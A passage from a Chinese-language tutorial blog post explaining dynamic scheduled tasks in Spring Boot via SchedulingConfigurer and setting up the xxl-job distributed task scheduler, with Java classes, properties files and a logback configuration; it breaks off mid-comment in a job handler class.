?</span><br></pre></td></tr></table></figure><p>编写实现定时任务的类，利用@PropertySource指定获取的配置文件并用@Value注入到相应成员中，并用@Component将该类注册为Bean</p><p>实现SchedulingConfigurer接口，重载configureTasks函数，</p><p>其中，configureTasks函数接收一个ScheduledTaskRegistrar类型的参数，调用该对象的addTriggerTask，接收一个Runnable对象用于执行任务，以及一个Trigger对象用于计算下一次执行任务的时间</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.task;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> lombok.Data;  </span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;  </span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.PropertySource;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.Trigger;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.TriggerContext;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.annotation.SchedulingConfigurer;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.config.ScheduledTaskRegistrar;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.support.CronTrigger;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.scheduling.support.PeriodicTrigger;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="meta">@Data</span>  </span><br><span class="line"><span class="meta">@Slf4j</span>  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span>  </span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:task-config.ini&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ScheduleTask</span> <span class="keyword">implements</span> <span class="title class_">SchedulingConfigurer</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// private Long timer = 100 * 1000L;  </span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;printTime.cron&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String cron;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureTasks</span><span class="params">(ScheduledTaskRegistrar taskRegistrar)</span> &#123;  </span><br><span class="line">        <span class="comment">// 间隔触发的任务  </span></span><br><span class="line">        taskRegistrar.addTriggerTask(<span class="keyword">new</span> <span class="title class_">Runnable</span>() &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">        &#125;, <span class="keyword">new</span> <span class="title class_">Trigger</span>() &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Date <span class="title function_">nextExecutionTime</span><span class="params">(TriggerContext triggerContext)</span> &#123;  </span><br><span class="line">            <span class="comment">// 使用CronTrigger触发器，可动态修改cron表达式来操作循环规则  </span></span><br><span class="line">            <span class="type">CronTrigger</span> <span class="variable">cronTrigger</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CronTrigger</span>(cron);  </span><br><span class="line">            <span class="type">Date</span> <span class="variable">nextExecutionTime</span> <span class="operator">=</span> cronTrigger.nextExecutionTime(triggerContext);  </span><br><span class="line">            <span class="keyword">return</span> nextExecutionTime;  </span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 使用PerodicTrigger触发器，修改timer变量指定操作间隔，单位为毫秒</span></span><br><span class="line">            <span class="comment">// PeriodicTrigger periodicTrigger = new PeriodicTrigger(timer);  </span></span><br><span class="line">            <span class="comment">// Date nextExecutionTime = periodicTrigger.nextExecutionTime(triggerContext);  </span></span><br><span class="line">            <span class="comment">// return nextExecutionTime;  </span></span><br><span class="line">        &#125;  </span><br><span class="line">        &#125;);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到这里使用了@Data注解，是为了能够直接调用成员变量的setter更改cron表达式(或timer)的值</p><p>编写Controller提供修改定时任务执行时间的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> lombok.RequiredArgsConstructor;  </span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;  </span><br><span class="line"><span class="keyword">import</span> com.szhg.dttnotice.task.ScheduleTask;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Slf4j</span>  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span>  </span><br><span class="line"><span class="meta">@RequestMapping(&quot;/notice&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoticeController</span> &#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ScheduleTask scheduleTask;  </span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/updateCron&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">updateCron</span><span class="params">(String cron)</span> &#123;  </span><br><span class="line">        log.info(<span class="string">&quot;new cron :&#123;&#125;&quot;</span>, cron);  </span><br><span class="line">        scheduleTask.setCron(cron);  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;执行任务的表达式修改为: &quot;</span> + cron ;  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="comment">// @GetMapping(&quot;/updateTimer&quot;)  </span></span><br><span class="line">    <span class="comment">// public String updateTimer(Long timer) &#123;  </span></span><br><span class="line">    <span class="comment">//     log.info(&quot;new timer :&#123;&#125;&quot;, timer);  </span></span><br><span class="line">    <span class="comment">//     scheduleTask.setTimer(timer * 1000);  </span></span><br><span class="line">    <span class="comment">//     return &quot;执行任务的时间间隔修改为&quot; + timer + &quot;s&quot;;  </span></span><br><span class="line">    <span class="comment">// &#125;  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、分布式定时任务"><a href="#三、分布式定时任务" class="headerlink" title="三、分布式定时任务"></a>三、分布式定时任务</h1><p>在分布式的架构中，我们需要一个支持集群、支持监控、支持告警等等功能的解决方案，那么上述方法就比较麻烦了。</p><p>主流的分布式任务调度平台包括elastic-job、xxl-job、quartz等</p><p>本文重点介绍xxl-job</p><p>首先从源码仓库地址将代码拉到本地：<a href="https://github.com/xuxueli/xxl-job">xuxueli/xxl-job: A distributed task scheduling framework.（分布式任务调度平台XXL-JOB） (github.com)</a></p><h2 id="1-运行调度中心"><a href="#1-运行调度中心" class="headerlink" title="1. 运行调度中心"></a>1. 运行调度中心</h2><p>从根路径下找到doc/db/tables_xxl_job.sql，在数据库中新建Schema，执行该sql脚本</p><p>DataGrip的示例如下：</p><p><img src="/img/2024/07/1.png" alt="image.png"></p><p>回看项目的根路径下有哪些模块：</p><ol><li>xxl-job-admin：任务调度的管理平台，跑起来后可在浏览器中访问</li><li>xxl-job-core：项目的公共依赖</li><li>xxl-job-executor-samples：执行器（也就是需要执行的任务）的示例</li></ol><p>找到admin项目下的application.properties文件：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 调度中心JDBC链接</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://127.0.0.1:3306/xxl_job?useUnicode=true&amp;characterEncoding=UTF-8&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">password</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="comment">### 报警邮箱</span></span><br><span class="line"><span class="attr">spring.mail.host</span>=<span class="string">smtp.qq.com</span></span><br><span class="line"><span class="attr">spring.mail.port</span>=<span class="string">25</span></span><br><span class="line"><span class="attr">spring.mail.username</span>=<span class="string">xxx@qq.com</span></span><br><span class="line"><span class="attr">spring.mail.password</span>=<span class="string">xxx</span></span><br><span class="line"><span class="attr">spring.mail.properties.mail.smtp.auth</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spring.mail.properties.mail.smtp.starttls.enable</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spring.mail.properties.mail.smtp.starttls.required</span>=<span class="string">true</span></span><br><span class="line"><span class="attr">spring.mail.properties.mail.smtp.socketFactory.class</span>=<span class="string">javax.net.ssl.SSLSocketFactory</span></span><br><span class="line"><span class="comment">### 调度中心通讯TOKEN [选填]：非空时启用；</span></span><br><span class="line"><span class="attr">xxl.job.accessToken</span>=<span class="string">default_token</span></span><br><span class="line"><span class="comment">### 调度中心国际化配置 [必填]： 默认为 &quot;zh_CN&quot;/中文简体, 可选范围为 &quot;zh_CN&quot;/中文简体, &quot;zh_TC&quot;/中文繁体 and &quot;en&quot;/英文；</span></span><br><span class="line"><span class="attr">xxl.job.i18n</span>=<span class="string">zh_CN</span></span><br><span class="line"><span class="comment">## 调度线程池最大线程配置【必填】</span></span><br><span class="line"><span class="attr">xxl.job.triggerpool.fast.max</span>=<span class="string">200</span></span><br><span class="line"><span class="attr">xxl.job.triggerpool.slow.max</span>=<span class="string">100</span></span><br><span class="line"><span class="comment">### 调度中心日志表数据保存天数 [必填]：过期日志自动清理；限制大于等于7时生效，否则, 如-1，关闭自动清理功能；</span></span><br><span class="line"><span class="attr">xxl.job.logretentiondays</span>=<span class="string">10</span></span><br></pre></td></tr></table></figure><p>datasource配置连接到我们刚才创建的数据库<br>mail配置报警邮箱<br>accessToken（重要）配置后，执行的任务也需要配置相同的accessToken</p><p>运行启动类（或者打成jar包运行）后，可在浏览器中访问到管理平台</p><h2 id="2-注册定时任务"><a href="#2-注册定时任务" class="headerlink" title="2. 注册定时任务"></a>2. 注册定时任务</h2><p>新建一个Springboot项目，并添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="comment">&lt;!-- 官网的demo是2.2.1，中央maven仓库还没有，所以就用2.2.0 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.xuxueli<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xxl-job-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># web port</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">8081</span></span><br><span class="line"><span class="comment"># log config</span></span><br><span class="line"><span class="attr">logging.config</span>=<span class="string">classpath:logback.xml</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">xxljob-demo</span></span><br><span class="line"><span class="comment">### 调度中心部署跟地址 [选填]：如调度中心集群部署存在多个地址则用逗号分隔。执行器将会使用该地址进行&quot;执行器心跳注册&quot;和&quot;任务结果回调&quot;；为空则关闭自动注册；</span></span><br><span class="line"><span class="attr">xxl.job.admin.addresses</span>=<span class="string">http://127.0.0.1:8080/xxl-job-admin</span></span><br><span class="line"><span class="comment">### 执行器通讯TOKEN [选填]：非空时启用；</span></span><br><span class="line"><span class="attr">xxl.job.accessToken</span>=<span class="string">default_token</span></span><br><span class="line"><span class="comment">### 执行器AppName [选填]：执行器心跳注册分组依据；为空则关闭自动注册</span></span><br><span class="line"><span class="attr">xxl.job.executor.appname</span>=<span class="string">xxl-job-demo</span></span><br><span class="line"><span class="comment">### 执行器注册 [选填]：优先使用该配置作为注册地址，为空时使用内嵌服务 ”IP:PORT“ 作为注册地址。从而更灵活的支持容器类型执行器动态IP和动态映射端口问题。</span></span><br><span class="line"><span class="attr">xxl.job.executor.address</span>=<span class="string"></span></span><br><span class="line"><span class="comment">### 执行器IP [选填]：默认为空表示自动获取IP，多网卡时可手动设置指定IP，该IP不会绑定Host仅作为通讯实用；地址信息用于 &quot;执行器注册&quot; 和 &quot;调度中心请求并触发任务&quot;；</span></span><br><span class="line"><span class="attr">xxl.job.executor.ip</span>=<span class="string">127.0.0.1</span></span><br><span class="line"><span class="comment">### 执行器端口号 [选填]：小于等于0则自动获取；默认端口为9999，单机部署多个执行器时，注意要配置不同执行器端口；</span></span><br><span class="line"><span class="attr">xxl.job.executor.port</span>=<span class="string">9999</span></span><br><span class="line"><span class="comment">### 执行器运行日志文件存储磁盘路径 [选填] ：需要对该路径拥有读写权限；为空则使用默认路径；</span></span><br><span class="line"><span class="attr">xxl.job.executor.logpath</span>=<span class="string">/data/applogs/xxl-job/jobhandler</span></span><br><span class="line"><span class="comment">### 执行器日志文件保存天数 [选填] ： 过期日志自动清理, 限制值大于等于3时生效; 否则, 如-1, 关闭自动清理功能；</span></span><br><span class="line"><span class="attr">xxl.job.executor.logretentiondays</span>=<span class="string">10</span></span><br></pre></td></tr></table></figure><p>注意这里的accessToken要与前面admin配置的accessToken保持一致</p><p>在resources目录下，配置日志输出logback.xml：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span> <span class="attr">debug</span>=<span class="string">&quot;false&quot;</span> <span class="attr">scan</span>=<span class="string">&quot;true&quot;</span> <span class="attr">scanPeriod</span>=<span class="string">&quot;1 seconds&quot;</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">contextName</span>&gt;</span>logback<span class="tag">&lt;/<span class="name">contextName</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;log.path&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/data/applogs/xxl-job/xxl-job-executor-sample-springboot.log&quot;</span>/&gt;</span>  </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;console&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%d&#123;HH:mm:ss.SSS&#125; %contextName [%thread] %-5level %logger&#123;36&#125; - %msg%n<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">file</span>&gt;</span>$&#123;log.path&#125;<span class="tag">&lt;/<span class="name">file</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">rollingPolicy</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">fileNamePattern</span>&gt;</span>$&#123;log.path&#125;.%d&#123;yyyy-MM-dd&#125;.zip<span class="tag">&lt;/<span class="name">fileNamePattern</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">rollingPolicy</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">encoder</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>%date %level [%thread] %logger&#123;36&#125; [%file : %line] %msg%n  </span><br><span class="line">            <span class="tag">&lt;/<span class="name">pattern</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">appender</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;console&quot;</span>/&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;file&quot;</span>/&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span>  </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>编写一个配置类，实例化一个XxlJobSpringExecutor类的Bean：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxljobdemo.config;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.executor.impl.XxlJobSpringExecutor;  </span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;  </span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Value;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Configuration</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XxlJobConfig</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(XxlJobConfig.class);  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.admin.addresses&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String adminAddresses;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.accessToken&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String accessToken;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.executor.appname&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String appname;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.executor.address&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String address;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.executor.ip&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String ip;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.executor.port&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> port;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.executor.logpath&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> String logPath;  </span><br><span class="line">    <span class="meta">@Value(&quot;$&#123;xxl.job.executor.logretentiondays&#125;&quot;)</span>  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> logRetentionDays;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Bean</span>  </span><br><span class="line">    <span class="keyword">public</span> XxlJobSpringExecutor <span class="title function_">xxlJobExecutor</span><span class="params">()</span> &#123;  </span><br><span class="line">        logger.info(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; xxl-job config init.&quot;</span>);  </span><br><span class="line">        <span class="type">XxlJobSpringExecutor</span> <span class="variable">xxlJobSpringExecutor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XxlJobSpringExecutor</span>();  </span><br><span class="line">        xxlJobSpringExecutor.setAdminAddresses(adminAddresses);  </span><br><span class="line">        xxlJobSpringExecutor.setAppname(appname);  </span><br><span class="line">        xxlJobSpringExecutor.setAddress(address);  </span><br><span class="line">        xxlJobSpringExecutor.setIp(ip);  </span><br><span class="line">        xxlJobSpringExecutor.setPort(port);  </span><br><span class="line">        xxlJobSpringExecutor.setAccessToken(accessToken);  </span><br><span class="line">        xxlJobSpringExecutor.setLogPath(logPath);  </span><br><span class="line">        xxlJobSpringExecutor.setLogRetentionDays(logRetentionDays);  </span><br><span class="line">        <span class="keyword">return</span> xxlJobSpringExecutor;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在管理平台注册执行器：</p><p><img src="/img/2024/07/2.png" alt="image.png"></p><p>AppName为配置文件中的xxl.job.executor.appname<br>手动录入才需要填写机器地址一栏<br>IP和端口号分别为配置文件中的：xxl.job.executor.ip 和 xxl.job.executor.port</p><p>编写一个任务类，使用Bean模式，也就是在任务对应的方法上添加@XxlJob注解，自定义JobHandler的名称</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xxljobdemo.jobhandler;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.ReturnT;  </span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.context.XxlJobHelper;  </span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.annotation.XxlJob;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XxlJobDemoHandler</span> &#123;  </span><br><span class="line">    <span class="comment">/**  </span></span><br><span class="line"><span class="comment">    * Bean模式，一个方法为一个任务  </span></span><br><span class="line"><span class="comment">    * 1、在Spring Bean实例中，开发Job方法，方式格式要求为 &quot;public ReturnT&lt;String&gt; execute(String param)&quot;  </span></span><br><span class="line"><span class="comment">    * 2、为Job方法添加注解 &quot;<span class="doctag">@XxlJob</span>(value=&quot;自定义jobhandler名称&quot;, init = &quot;JobHandler初始化方法&quot;, destroy = 